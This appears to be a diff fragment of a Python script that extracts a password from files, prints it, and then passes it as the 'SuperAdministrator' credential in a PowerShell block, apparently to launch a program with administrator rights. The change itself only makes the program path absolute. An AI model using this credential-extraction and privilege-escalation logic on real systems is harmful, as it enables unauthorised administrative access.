@@ -61,7 +61,9 @@ def find_files(targets, base_dir=""):
                         print(f'[+] Extracted Password: {ascii_string}')
                         admin_user = "SuperAdministrator"
                         admin_pass = ascii_string
-                        program = "NeedsAdminPrivilege.exe"
+                        
+                        program_name = "NeedsAdminPrivilege.exe"
+                        program = os.path.abspath(program_name)
                         
                         ps_script = f"""
                         $secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force
